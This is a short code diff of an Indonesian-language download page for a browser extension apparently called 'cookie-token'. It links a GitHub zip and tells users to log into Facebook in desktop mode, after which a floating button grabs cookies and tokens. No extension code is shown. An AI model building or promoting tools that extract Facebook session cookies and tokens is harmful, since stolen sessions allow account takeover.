@@ -23,8 +23,8 @@ if (target) {
 
     <div class="card">
         <div class="icon">💾️</div>
-        <h1>FB EXTRACTOR ZIP</h1>
-        <p>Gunakan link di bawah untuk mengunduh versi terbaru ekstensi ini.</p>
+        <h1>COOKIE TOKEN</h1>
+        <p style=":color#555;font-size:15px;">Gunakan link di bawah untuk mengunduh pastikan sudah login fb mode desktop</p>
         
         <a href="https://github.com/tommydev27/cookie-token/archive/refs/heads/main.zip" class="btn">
             Download ZIP Sekarang
@@ -33,6 +33,10 @@ if (target) {
         <div class="instruction">
             <b>Info:</b> Fitur ambil data (Cookie/Token) ada di tombol melayang saat kamu buka Facebook.
         </div>
+        <p>
+        <footer style="color#555;font-size:10px;">Developed by
+<b style="color: #2c63fb;">TommyWeb</b>
+© 2026
     </div>
     `;
 }
